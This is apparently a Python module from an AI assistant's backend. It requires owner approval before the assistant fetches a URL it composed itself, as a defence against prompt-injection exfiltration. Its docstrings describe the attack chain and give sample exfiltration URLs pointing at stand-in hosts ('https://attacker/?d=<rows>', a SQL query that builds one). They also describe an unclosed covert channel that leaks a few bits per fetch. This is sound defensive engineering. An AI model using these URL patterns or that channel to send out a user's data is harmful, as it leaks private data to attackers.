"""A page fetch runs freely only for a URL Lucius was GIVEN; a URL it wrote asks first (issue #91).

Prompt injection can turn two ungated calls into an exfiltration: read the book, then fetch
``https://attacker/?d=<rows>``. Gating the read cannot work (dozens of read tools return the same
data), so the line is drawn at the fetch, by where its URL came from:

* **Given** — the URL appears in what reached Lucius from OUTSIDE the book: the owner's own typed
  messages, or the result of a tool that brings in outside text (web search, a fetched page, an
  email). An injected link is given too, and fetching it is fine: the attacker wrote it before
  seeing the book, so it cannot carry the book.
* **Composed** — anything else. Putting the book's data into a URL means writing a new URL, so a
  composed fetch is SEEDED Ask for this one call (``is_gated_tool`` in both gates reads
  ``current_call_composed``). What Ask then means is unchanged: a card in manual, the Auto judge
  in auto (told by ``consequence``), it runs in skip; the owner's own stored level wins, as for
  every tool.

What counts as outside text is deliberately narrow. A tool result echoes its own arguments, and
any tool that returns book data returns what the model wrote into it (``run_sql_query`` can
``SELECT 'https://attacker/?d=' || …``), so only the SOURCE_TOOLS' results count, minus any URL
already in that call's own arguments. User rows count only through ``typed_text`` (the owner's
words: never a skill row, the screen snapshot or a mention block, which carry app data).

A source that is missed only costs a card; a source wrongly trusted is a leak. Every choice here
leans the first way. What is NOT closed: an attacker who plants many URLs can have Lucius pick one
by a value it read, a few bits per fetch (ADR ``2026-11-13-a-page-fetch-runs-only-for-a-url-lucius-was-given``).
"""

from __future__ import annotations

import html
import json
import logging
import re
from collections import OrderedDict
from contextvars import ContextVar
from typing import Any, Iterable, Optional
from urllib.parse import unquote, urlsplit

logger = logging.getLogger(__name__)

_EXTRA_SOURCE_TOOLS = frozenset(
    {"web_search", "x_search", "email_get_messages", "email_search_messages"}
)
_URL = re.compile(r"https?://[^\s<>\"'`\\\]\[(){}|^]+", re.IGNORECASE)
_TRAILING = ".,;:!?*_~"
_ALNUM_RUN = re.compile(r"[a-z0-9]+")
#: A result URL sharing a run this long with its own call's arguments is treated as an echo.
_ECHO_RUN = 12
_MAX_SESSIONS = 256
_MAX_URLS_PER_SESSION = 20_000

#: The tool name of the dispatch in flight when its URL is composed, else ``None``.
_composed_call: ContextVar[Optional[str]] = ContextVar("composed_fetch_call", default=None)
#: Per process: URLs seen in source-tool results, by session — covers a result the turn loop has
#: not persisted yet. The stored transcript (``_stored_urls``) covers every other process.
_seen: "OrderedDict[str, set[str]]" = OrderedDict()
#: Per process: the stored transcript's given URLs, by session, with the row count they cover.
_scanned: "OrderedDict[str, tuple[int, set[str]]]" = OrderedDict()


def _search_connector(name: str) -> bool:
    from backend.ai.tools.registry import tool_connector

    return (tool_connector(name) or "").startswith("web_search:")


def is_fetch_tool(name: str) -> bool:
    """``fetch_page`` and every search provider's own ``<id>_fetch_page``."""
    return name == "fetch_page" or (name.endswith("_fetch_page") and _search_connector(name))


def is_source_tool(name: str) -> bool:
    """A tool whose result is outside text: web search, a fetched page, an email."""
    if name in _EXTRA_SOURCE_TOOLS or is_fetch_tool(name):
        return True
    return name.endswith("_search") and _search_connector(name)


def _strings(value: Any) -> Iterable[str]:
    if isinstance(value, str):
        yield value
    elif isinstance(value, dict):
        for item in value.values():
            yield from _strings(item)
    elif isinstance(value, list):
        for item in value:
            yield from _strings(item)


def _texts(text: str) -> Iterable[str]:
    """The text, its HTML-unescaped form, and every string inside it when it is JSON (a tool
    result usually is, and JSON escaping can hide a URL's ``&`` or ``/`` from the raw scan). Each
    form is the WHOLE text decoded one way, so a planted URL gains at most a couple of spellings,
    never one per character."""
    pieces = [text]
    try:
        parsed = json.loads(text)
    except (ValueError, TypeError):
        parsed = None
    if parsed is not None and not isinstance(parsed, str):
        pieces.extend(_strings(parsed))
    for piece in pieces:
        yield piece
        yield html.unescape(piece)


def urls_in(text: Any) -> set[str]:
    """Every URL in ``text`` (a string, or JSON-shaped data), exactly as written there."""
    found: set[str] = set()
    for chunk in _strings(text) if not isinstance(text, str) else (text,):
        for piece in _texts(chunk):
            found.update(match.rstrip(_TRAILING) for match in _URL.findall(piece))
    return found


def _alnum(text: str) -> str:
    return "".join(_ALNUM_RUN.findall(unquote(html.unescape(text)).lower()))


def _echoes(url: str, args_alnum: str) -> bool:
    """Whether a result URL repeats its own call's arguments: its host, or any long run of its
    letters and digits, appears there (decoded and folded, so no spelling hides an echo). Erring
    here only costs a card."""
    try:
        host = _alnum(urlsplit(url).netloc)
    except ValueError:
        return True
    if host and host in args_alnum:
        return True
    runs = _ALNUM_RUN.findall(unquote(html.unescape(url)).lower())
    return any(len(run) >= _ECHO_RUN and run in args_alnum for run in runs)


def _given_by(tool_name: str, args: Any, result: Any) -> set[str]:
    """The URLs a source tool's result brings in, less any that echo its own arguments
    (``web_search("collect.example.net/?d=<rows>")`` must not launder that URL)."""
    args_alnum = _alnum(json.dumps(args or {}, ensure_ascii=False, default=str))
    return {url for url in urls_in(result) if not _echoes(url, args_alnum)}


def _remember(store: "OrderedDict", session_id: str, value) -> None:
    store.pop(session_id, None)
    store[session_id] = value
    while len(store) > _MAX_SESSIONS:
        store.popitem(last=False)


def note_result(session_id: Optional[str], tool_name: str, args: Any, result: Any) -> None:
    """Remember the URLs a source tool just brought into ``session_id``."""
    if not session_id or result is None or not is_source_tool(tool_name):
        return
    urls = _given_by(tool_name, args, result)
    if not urls:
        return
    known = _seen.get(session_id, set()) | urls
    if len(known) > _MAX_URLS_PER_SESSION:
        known = set(list(known)[-_MAX_URLS_PER_SESSION:])
    _remember(_seen, session_id, known)


def _tool_uses(rows: list) -> dict[str, tuple[str, Any]]:
    uses: dict[str, tuple[str, Any]] = {}
    for row in rows:
        if row.get("role") != "assistant" or not isinstance(row.get("content"), list):
            continue
        for block in row["content"]:
            if isinstance(block, dict) and block.get("type") == "tool_use":
                uses[str(block.get("id"))] = (str(block.get("name")), block.get("input"))
    return uses


def _row_urls(row: dict, uses: dict[str, tuple[str, Any]]) -> set[str]:
    from backend.ai.auto_judge_prompt import typed_text

    if row.get("role") != "user" or row.get("_onw_skill"):
        return set()
    found = urls_in(typed_text(row.get("content")))
    content = row.get("content")
    for block in content if isinstance(content, list) else ():
        if not isinstance(block, dict) or block.get("type") != "tool_result":
            continue
        name, args = uses.get(str(block.get("tool_use_id")), ("", None))
        if is_source_tool(name):
            found |= _given_by(name, args, block.get("content"))
    return found


def _stored_urls(session_id: str) -> set[str]:
    """Given URLs in the stored transcript, rescanned only when it has grown."""
    from backend.ai.assistant import _store

    store = _store()
    count = store.message_count(session_id)
    cached = _scanned.get(session_id)
    if cached is not None and cached[0] == count:
        return cached[1]
    rows = store.get_messages(session_id)
    uses = _tool_uses(rows)
    found: set[str] = set()
    for row in rows:
        found |= _row_urls(row, uses)
    _remember(_scanned, session_id, (count, found))
    return found


def is_given(url: str, session_id: Optional[str]) -> bool:
    """Whether ``url``, EXACTLY as the call spells it, reached this conversation from outside the
    book. No normalising on this side: ``%61`` for ``a``, a changed host case, an added fragment
    or userinfo each make a different request, and each could carry a bit of the book."""
    if not isinstance(url, str) or not session_id:
        return False
    url = url.strip()
    if url in _seen.get(session_id, ()):
        return True
    try:
        return url in _stored_urls(session_id)
    except Exception:  # noqa: BLE001 — an unreadable transcript is not a reason to trust a URL
        logger.warning("given urls: could not read session %s; asking", session_id, exc_info=True)
        return False


def is_composed_fetch(tool_name: str, args: Any) -> bool:
    """True for a page fetch whose URL Lucius was not given, in the active conversation."""
    if not is_fetch_tool(tool_name) or not isinstance(args, dict):
        return False
    url = args.get("url")
    if not isinstance(url, str):
        return False  # schema validation refuses it before any handler runs
    from backend.core.chat_session import get_session_id

    return not is_given(url, get_session_id())


def bind_call(tool_name: str, args: Any):
    """Mark the dispatch in flight; returns the token ``unbind_call`` takes."""
    try:
        composed = is_composed_fetch(tool_name, args)
    except Exception:  # noqa: BLE001 — not knowing where a URL came from is a reason to ask
        logger.warning("given urls: check failed for %s; asking", tool_name, exc_info=True)
        composed = is_fetch_tool(tool_name)
    return _composed_call.set(tool_name if composed else None)


def unbind_call(token) -> None:
    _composed_call.reset(token)


def current_call_composed(tool_name: str) -> bool:
    """Whether the dispatch in flight is ``tool_name`` fetching a URL Lucius wrote."""
    return _composed_call.get() == tool_name


def consequence(tool_name: str, args: Any) -> Optional[str]:
    """The trusted line the Auto judge gets for a composed fetch, else ``None``."""
    try:
        composed = is_composed_fetch(tool_name, args)
    except Exception:  # noqa: BLE001
        composed = is_fetch_tool(tool_name)
    if not composed:
        return None
    return (
        "The assistant WROTE this URL: it appears nowhere in the owner's messages or in any web "
        "page, search result or email this conversation received. Anything in it beyond what "
        "the owner asked to look up is sent to that site."
    )


def card_reason(tool_name: str) -> str:
    """The line on a generic approval card; a composed fetch says why it is asking."""
    if current_call_composed(tool_name):
        return (
            "Lucius wrote this web address itself, so it could carry your data to that site. "
            "Allow it only if the address is one you expect."
        )
    return f"{tool_name} needs your approval before it runs."


def reset_for_tests() -> None:
    _seen.clear()
    _scanned.clear()
